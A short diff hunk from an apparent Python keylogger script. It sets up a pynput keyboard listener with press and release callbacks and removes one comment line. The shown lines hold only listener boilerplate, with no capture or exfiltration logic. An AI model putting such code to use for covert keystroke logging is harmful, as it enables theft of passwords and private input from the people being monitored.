@@ -37,7 +37,6 @@ with keyboard.Listener(
         on_release=keyLogger.on_release) as listener:
     listener.join()
 
-# ...or, in a non-blocking fashion:
 listener = keyboard.Listener(
     on_press=keyLogger.on_press,
     on_release=keyLogger.on_release,)
